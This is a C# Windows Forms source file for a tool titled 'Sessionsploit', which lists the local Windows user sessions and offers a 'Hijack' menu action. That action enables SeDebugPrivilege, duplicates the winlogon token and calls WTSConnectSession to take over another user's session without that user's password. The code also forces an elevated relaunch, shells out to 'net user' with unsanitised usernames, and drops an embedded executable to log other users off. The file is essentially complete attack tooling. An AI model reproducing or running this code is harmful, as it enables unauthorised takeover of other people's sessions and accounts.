using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace sessionhijack
{
  public class Form1 : Form
  {
    private int noadminprivs;
    private IContainer components = (IContainer) null;
    private DataGridView dataGridView1;
    private ContextMenuStrip useroptions;
    private ToolStripMenuItem hijackToolStripMenuItem;
    private ToolStripMenuItem informationToolStripMenuItem;
    private ToolStripMenuItem logOutToolStripMenuItem;
    private ToolStripMenuItem passwordToolStripMenuItem;
    private ToolStripMenuItem processesToolStripMenuItem;
    private DataGridViewTextBoxColumn username;
    private DataGridViewTextBoxColumn domain;
    private DataGridViewTextBoxColumn state;
    private DataGridViewTextBoxColumn IsAdmin;
    private DataGridViewTextBoxColumn sessionid;
    private ToolStripMenuItem refreshToolStripMenuItem;

    public Form1()
    {
      this.InitializeComponent();
      this.AdminRelauncher();
      if (this.noadminprivs != 1)
        return;
      this.Close();
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.GetTSSessions();
      this.dataGridView1.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
      this.dataGridView1.MultiSelect = false;
      this.dataGridView1.GridColor = Color.LightGray;
      this.dataGridView1.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
    }

    private void AdminRelauncher()
    {
      if (this.IsRunAsAdmin())
        return;
      this.noadminprivs = 1;
      ProcessStartInfo startInfo = new ProcessStartInfo();
      startInfo.UseShellExecute = true;
      startInfo.WorkingDirectory = Environment.CurrentDirectory;
      startInfo.FileName = Assembly.GetEntryAssembly().CodeBase;
      startInfo.Verb = "runas";
      try
      {
        Process.Start(startInfo);
        Application.Exit();
      }
      catch
      {
        int num = (int) MessageBox.Show("Program must run as Administrator", "Sessionsploit", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      Application.Exit();
    }

    private bool IsRunAsAdmin()
    {
      try
      {
        return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
      }
      catch (Exception ex)
      {
        return false;
      }
    }

    private void dataGridView1_MouseClick(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Right)
        return;
      DataGridView.HitTestInfo hitTestInfo = this.dataGridView1.HitTest(e.X, e.Y);
      this.dataGridView1.ClearSelection();
      this.dataGridView1.Rows[hitTestInfo.RowIndex].Selected = true;
      this.useroptions.Show((Control) this.dataGridView1, e.Location);
    }

    private void GetTSSessions()
    {
      string pServerName = "localhost";
      IntPtr serverHandle = IntPtr.Zero;
      List<string> stringList = new List<string>();
      serverHandle = Win32.WTSOpenServer(pServerName);
      try
      {
        IntPtr ppSessionInfo = IntPtr.Zero;
        IntPtr zero1 = IntPtr.Zero;
        IntPtr zero2 = IntPtr.Zero;
        int pCount = 0;
        bool flag = Win32.WTSEnumerateSessions(serverHandle, 0, 1, out ppSessionInfo, out pCount);
        int num = Marshal.SizeOf(typeof (Win32.WTS_SESSION_INFO));
        IntPtr ptr = ppSessionInfo;
        if (flag)
        {
          for (int index = 0; index < pCount; ++index)
          {
            Win32.WTS_SESSION_INFO structure = (Win32.WTS_SESSION_INFO) Marshal.PtrToStructure(ptr, typeof (Win32.WTS_SESSION_INFO));
            ptr += num;
            if (!(structure.SessionId.ToString() == "0"))
            {
              string str1 = structure.SessionId.ToString();
              string str2 = "Unknown";
              if (structure.State == Win32.WTS_CONNECTSTATE_CLASS.WTSActive)
                str2 = "Active";
              else if (structure.State == Win32.WTS_CONNECTSTATE_CLASS.WTSConnected)
                str2 = "Connecting";
              else if (structure.State == Win32.WTS_CONNECTSTATE_CLASS.WTSConnectQuery)
                str2 = "ConnectQuery";
              else if (structure.State == Win32.WTS_CONNECTSTATE_CLASS.WTSDisconnected)
                str2 = "Disconnected";
              else if (structure.State == Win32.WTS_CONNECTSTATE_CLASS.WTSDown)
                str2 = "Down due to error";
              else if (structure.State == Win32.WTS_CONNECTSTATE_CLASS.WTSIdle)
                str2 = "Idle and waiting for connection";
              else if (structure.State == Win32.WTS_CONNECTSTATE_CLASS.WTSInit)
                str2 = "initializing";
              else if (structure.State == Win32.WTS_CONNECTSTATE_CLASS.WTSListen)
                str2 = "Listening for a connection";
              else if (structure.State == Win32.WTS_CONNECTSTATE_CLASS.WTSReset)
                str2 = "Resetting a connection";
              else if (structure.State == Win32.WTS_CONNECTSTATE_CLASS.WTSShadow)
                str2 = "Shadowing";
              string[] strArray = GetUsernameBySessionId(serverHandle, structure.SessionId).Split('\\');
              string str3 = strArray[0];
              string selecteduser = strArray[1];
              string str4 = Checkadmin(selecteduser);
              CreateRow(new string[5]
              {
                selecteduser,
                str3,
                str2,
                str1,
                str4
              });
            }
          }
        }
        Win32.WTSFreeMemory(zero1);
        Win32.WTSFreeMemory(zero2);
        Win32.WTSCloseServer(serverHandle);
        Win32.WTSFreeMemory(ppSessionInfo);
      }
      catch
      {
        int num = (int) MessageBox.Show("Error occurred", "Sessionsploit", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }

      static string Checkadmin(string selecteduser)
      {
        try
        {
          Process process = new Process()
          {
            StartInfo = new ProcessStartInfo()
            {
              FileName = "cmd.exe",
              Arguments = "/c net localgroup \"Administrators\" | find \"" + selecteduser + "\"",
              RedirectStandardOutput = true,
              UseShellExecute = false,
              CreateNoWindow = true,
              StandardOutputEncoding = Encoding.UTF8
            }
          };
          process.Start();
          string end = process.StandardOutput.ReadToEnd();
          process.WaitForExit();
          process.Close();
          return end == "" ? "False" : "True";
        }
        catch
        {
          int num = (int) MessageBox.Show("Error occurred", "Sessionsploit", MessageBoxButtons.OK, MessageBoxIcon.Hand);
          return "";
        }
      }

      void CreateRow(string[] information)
      {
        DataGridViewRow row = this.dataGridView1.Rows[this.dataGridView1.Rows.Add()];
        row.Cells["username"].Value = (object) information[0];
        row.Cells["domain"].Value = (object) information[1];
        row.Cells["state"].Value = (object) information[2];
        row.Cells["sessionid"].Value = (object) information[3];
        row.Cells["IsAdmin"].Value = (object) information[4];
      }

      string GetUsernameBySessionId(IntPtr serverHandle1, int sessionId)
      {
        string usernameBySessionId = "";
        IntPtr ppBuffer;
        uint pBytesReturned;
        if (Win32.WTSQuerySessionInformation(serverHandle, sessionId, Win32.WTS_INFO_CLASS.WTSUserName, out ppBuffer, out pBytesReturned) && pBytesReturned > 1U)
        {
          usernameBySessionId = Marshal.PtrToStringAnsi(ppBuffer);
          Win32.WTSFreeMemory(ppBuffer);
          if (Win32.WTSQuerySessionInformation(serverHandle, sessionId, Win32.WTS_INFO_CLASS.WTSDomainName, out ppBuffer, out pBytesReturned) && pBytesReturned > 1U)
          {
            usernameBySessionId = Marshal.PtrToStringAnsi(ppBuffer) + "\\" + usernameBySessionId;
            Win32.WTSFreeMemory(ppBuffer);
          }
        }
        return usernameBySessionId;
      }
    }

    private void hijackToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.dataGridView1.SelectedRows.Count <= 0)
          return;
        string s = (string) this.dataGridView1.SelectedRows[0].Cells["sessionid"].Value;
        int targetSessionId = int.Parse(s);
        if (s == null)
          return;
        int activeSession = Form1.GetActiveSession();
        if (!Form1.AdjustTokenPrivilege("SeDebugPrivilege"))
        {
          int num1 = (int) MessageBox.Show("Error occurred", "Sessionsploit", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        else if (!Form1.ImpersonateContext("winlogon"))
        {
          int num2 = (int) MessageBox.Show("Error occurred", "Sessionsploit", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        else
        {
          string password = "";
          Win32.WTSConnectSession(targetSessionId, activeSession, password, true);
        }
      }
      catch
      {
        int num = (int) MessageBox.Show("Error occurred", "Sessionsploit", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private static int GetActiveSession()
    {
      IntPtr ppSessionInfo = IntPtr.Zero;
      int pCount = 0;
      int activeSession = 0;
      try
      {
        if (Win32.WTSEnumerateSessions(IntPtr.Zero, 0, 1, out ppSessionInfo, out pCount))
        {
          IntPtr ptr = ppSessionInfo;
          for (int index = 1; index < pCount; ++index)
          {
            Win32.WTS_SESSION_INFO structure = (Win32.WTS_SESSION_INFO) Marshal.PtrToStructure(ptr, typeof (Win32.WTS_SESSION_INFO));
            if (structure.State == Win32.WTS_CONNECTSTATE_CLASS.WTSActive)
              activeSession = structure.SessionId;
            ptr += Marshal.SizeOf(typeof (Win32.WTS_SESSION_INFO));
          }
        }
      }
      finally
      {
        if (ppSessionInfo != IntPtr.Zero)
          Win32.WTSFreeMemory(ppSessionInfo);
      }
      return activeSession;
    }

    private static bool AdjustTokenPrivilege(string priv)
    {
      try
      {
        IntPtr currentProcess = Win32.GetCurrentProcess();
        IntPtr TokenHandle = IntPtr.Zero;
        bool flag = Win32.OpenProcessToken(currentProcess, 983551U, out TokenHandle);
        Win32.TokPriv1Luid newst;
        newst.Count = 1;
        newst.Luid = 0L;
        newst.Attr = 2;
        flag = Win32.LookupPrivilegeValue((string) null, priv, ref newst.Luid);
        return Win32.AdjustTokenPrivileges(TokenHandle, false, ref newst, 0, IntPtr.Zero, IntPtr.Zero);
      }
      catch
      {
        return false;
      }
    }

    private static bool ImpersonateContext(string proc)
    {
      try
      {
        Process process = Process.GetProcessesByName(proc)[0];
        IntPtr TokenHandle = IntPtr.Zero;
        bool flag = Win32.OpenProcessToken(process.Handle, 6U, out TokenHandle);
        IntPtr DuplicateTokenHandle = IntPtr.Zero;
        flag = Win32.DuplicateToken(TokenHandle, 2, out DuplicateTokenHandle);
        return Win32.SetThreadToken(IntPtr.Zero, DuplicateTokenHandle);
      }
      catch
      {
        return false;
      }
    }

    private void informationToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        string str = (string) this.dataGridView1.SelectedRows[0].Cells["username"].Value;
      }
      catch
      {
        int num = (int) MessageBox.Show("Error occurred", "Sessionsploit", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        return;
      }
      try
      {
        string str = (string) this.dataGridView1.SelectedRows[0].Cells["username"].Value;
        if (str == null)
          return;
        Process process = new Process()
        {
          StartInfo = new ProcessStartInfo()
          {
            FileName = "cmd.exe",
            Arguments = "/c net user " + str + " | findstr /v \"The command completed successfully\" | findstr /v \"Logon script\" | findstr /v \"Home directory\" | findstr /v \"Comment\" | findstr /v \"group membership\" | findstr /v \"Group Memberships\"",
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true,
            StandardOutputEncoding = Encoding.UTF8
          }
        };
        process.Start();
        string end = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        Infotab infotab = new Infotab();
        infotab.label1.Text = end;
        infotab.Show();
      }
      catch
      {
        int num = (int) MessageBox.Show("Error occurred", "Sessionsploit", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private async void logOutToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        string selecteduser = (string) this.dataGridView1.SelectedRows[0].Cells["username"].Value;
        selecteduser = (string) null;
      }
      catch
      {
        return;
      }
      try
      {
        string selecteduser = (string) this.dataGridView1.SelectedRows[0].Cells["username"].Value;
        string selectedid = (string) this.dataGridView1.SelectedRows[0].Cells["sessionid"].Value;
        Assembly assembly = Assembly.GetExecutingAssembly();
        Stream resourceStream = assembly.GetManifestResourceStream("sessionhijack.logoff.exe");
        string tempFile = Path.GetTempFileName();
        using (FileStream fileStream = new FileStream(tempFile, FileMode.Create))
          resourceStream.CopyTo((Stream) fileStream);
        Process process = new Process();
        process.StartInfo.FileName = tempFile;
        process.StartInfo.Arguments = " " + selectedid;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.CreateNoWindow = true;
        await Task.Run((Action) (() =>
        {
          process.Start();
          process.WaitForExit();
        }));
        int errorCode = process.ExitCode;
        process.Close();
        await Task.Delay(2000);
        if (errorCode != 0)
        {
          int num1 = (int) MessageBox.Show("Error occurred", "Sessionsploit", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        else
        {
          int num2 = (int) MessageBox.Show(selecteduser + " has been logged out", "Logout", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
          this.dataGridView1.Rows.Clear();
          this.GetTSSessions();
          this.dataGridView1.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
          this.dataGridView1.MultiSelect = false;
          this.dataGridView1.GridColor = Color.LightGray;
          this.dataGridView1.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
        }
        selecteduser = (string) null;
        selectedid = (string) null;
        assembly = (Assembly) null;
        resourceStream = (Stream) null;
        tempFile = (string) null;
      }
      catch
      {
      }
    }

    private void passwordToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        string str = (string) this.dataGridView1.SelectedRows[0].Cells["username"].Value;
      }
      catch
      {
        return;
      }
      try
      {
        new Password((string) this.dataGridView1.SelectedRows[0].Cells["username"].Value).Show();
      }
      catch
      {
        int num = (int) MessageBox.Show("Error occurred", "Sessionsploit", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }

    private void processesToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        new Processes((string) this.dataGridView1.SelectedRows[0].Cells["username"].Value).Show();
      }
      catch
      {
      }
    }

    private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.dataGridView1.Rows.Clear();
      this.GetTSSessions();
      this.dataGridView1.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
      this.dataGridView1.MultiSelect = false;
      this.dataGridView1.GridColor = Color.LightGray;
      this.dataGridView1.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.dataGridView1 = new DataGridView();
      this.username = new DataGridViewTextBoxColumn();
      this.domain = new DataGridViewTextBoxColumn();
      this.state = new DataGridViewTextBoxColumn();
      this.IsAdmin = new DataGridViewTextBoxColumn();
      this.sessionid = new DataGridViewTextBoxColumn();
      this.useroptions = new ContextMenuStrip(this.components);
      this.hijackToolStripMenuItem = new ToolStripMenuItem();
      this.passwordToolStripMenuItem = new ToolStripMenuItem();
      this.logOutToolStripMenuItem = new ToolStripMenuItem();
      this.processesToolStripMenuItem = new ToolStripMenuItem();
      this.informationToolStripMenuItem = new ToolStripMenuItem();
      this.refreshToolStripMenuItem = new ToolStripMenuItem();
      ((ISupportInitialize) this.dataGridView1).BeginInit();
      this.useroptions.SuspendLayout();
      this.SuspendLayout();
      this.dataGridView1.AllowUserToAddRows = false;
      this.dataGridView1.AllowUserToDeleteRows = false;
      this.dataGridView1.AllowUserToResizeColumns = false;
      this.dataGridView1.AllowUserToResizeRows = false;
      this.dataGridView1.BackgroundColor = Color.White;
      this.dataGridView1.BorderStyle = BorderStyle.None;
      this.dataGridView1.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
      this.dataGridView1.Columns.AddRange((DataGridViewColumn) this.username, (DataGridViewColumn) this.domain, (DataGridViewColumn) this.state, (DataGridViewColumn) this.IsAdmin, (DataGridViewColumn) this.sessionid);
      this.dataGridView1.ContextMenuStrip = this.useroptions;
      this.dataGridView1.Location = new Point(5, 5);
      this.dataGridView1.Name = "dataGridView1";
      this.dataGridView1.RowHeadersVisible = false;
      this.dataGridView1.ScrollBars = ScrollBars.Vertical;
      this.dataGridView1.SelectionMode = DataGridViewSelectionMode.CellSelect;
      this.dataGridView1.Size = new Size(567, (int) byte.MaxValue);
      this.dataGridView1.TabIndex = 1;
      this.username.AutoSizeMode = DataGridViewAutoSizeColumnMode.None;
      this.username.HeaderText = "Username";
      this.username.Name = "username";
      this.username.ReadOnly = true;
      this.username.Resizable = DataGridViewTriState.False;
      this.username.SortMode = DataGridViewColumnSortMode.Programmatic;
      this.domain.HeaderText = "Domain";
      this.domain.Name = "domain";
      this.domain.ReadOnly = true;
      this.domain.Resizable = DataGridViewTriState.False;
      this.domain.SortMode = DataGridViewColumnSortMode.Programmatic;
      this.domain.Width = 150;
      this.state.HeaderText = "State";
      this.state.Name = "state";
      this.state.ReadOnly = true;
      this.state.Resizable = DataGridViewTriState.False;
      this.state.SortMode = DataGridViewColumnSortMode.Programmatic;
      this.state.Width = 120;
      this.IsAdmin.HeaderText = "Admin";
      this.IsAdmin.Name = "IsAdmin";
      this.IsAdmin.ReadOnly = true;
      this.IsAdmin.SortMode = DataGridViewColumnSortMode.Programmatic;
      this.IsAdmin.Width = 101;
      this.sessionid.HeaderText = "Session ID";
      this.sessionid.Name = "sessionid";
      this.sessionid.ReadOnly = true;
      this.sessionid.Resizable = DataGridViewTriState.False;
      this.sessionid.SortMode = DataGridViewColumnSortMode.Programmatic;
      this.sessionid.Width = 95;
      this.useroptions.Items.AddRange(new ToolStripItem[6]
      {
        (ToolStripItem) this.hijackToolStripMenuItem,
        (ToolStripItem) this.passwordToolStripMenuItem,
        (ToolStripItem) this.processesToolStripMenuItem,
        (ToolStripItem) this.informationToolStripMenuItem,
        (ToolStripItem) this.logOutToolStripMenuItem,
        (ToolStripItem) this.refreshToolStripMenuItem
      });
      this.useroptions.Name = "useroptions";
      this.useroptions.Size = new Size(138, 136);
      this.hijackToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("hijackToolStripMenuItem.Image");
      this.hijackToolStripMenuItem.Name = "hijackToolStripMenuItem";
      this.hijackToolStripMenuItem.Size = new Size(137, 22);
      this.hijackToolStripMenuItem.Text = "Hijack";
      this.hijackToolStripMenuItem.Click += new EventHandler(this.hijackToolStripMenuItem_Click);
      this.passwordToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("passwordToolStripMenuItem.Image");
      this.passwordToolStripMenuItem.Name = "passwordToolStripMenuItem";
      this.passwordToolStripMenuItem.Size = new Size(180, 22);
      this.passwordToolStripMenuItem.Text = "Password";
      this.passwordToolStripMenuItem.Click += new EventHandler(this.passwordToolStripMenuItem_Click);
      this.logOutToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("logOutToolStripMenuItem.Image");
      this.logOutToolStripMenuItem.Name = "logOutToolStripMenuItem";
      this.logOutToolStripMenuItem.Size = new Size(180, 22);
      this.logOutToolStripMenuItem.Text = "Logout";
      this.logOutToolStripMenuItem.Click += new EventHandler(this.logOutToolStripMenuItem_Click);
      this.processesToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("processesToolStripMenuItem.Image");
      this.processesToolStripMenuItem.Name = "processesToolStripMenuItem";
      this.processesToolStripMenuItem.Size = new Size(180, 22);
      this.processesToolStripMenuItem.Text = "Processes";
      this.processesToolStripMenuItem.Click += new EventHandler(this.processesToolStripMenuItem_Click);
      this.informationToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("informationToolStripMenuItem.Image");
      this.informationToolStripMenuItem.Name = "informationToolStripMenuItem";
      this.informationToolStripMenuItem.Size = new Size(180, 22);
      this.informationToolStripMenuItem.Text = "Information";
      this.informationToolStripMenuItem.Click += new EventHandler(this.informationToolStripMenuItem_Click);
      this.refreshToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("refreshToolStripMenuItem.Image");
      this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
      this.refreshToolStripMenuItem.Size = new Size(180, 22);
      this.refreshToolStripMenuItem.Text = "Refresh";
      this.refreshToolStripMenuItem.Click += new EventHandler(this.refreshToolStripMenuItem_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(577, 265);
      this.Controls.Add((Control) this.dataGridView1);
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MaximizeBox = false;
      this.Name = nameof (Form1);
      this.Text = "Sessionsploit";
      this.Load += new EventHandler(this.Form1_Load);
      ((ISupportInitialize) this.dataGridView1).EndInit();
      this.useroptions.ResumeLayout(false);
      this.ResumeLayout(false);
    }
  }
}
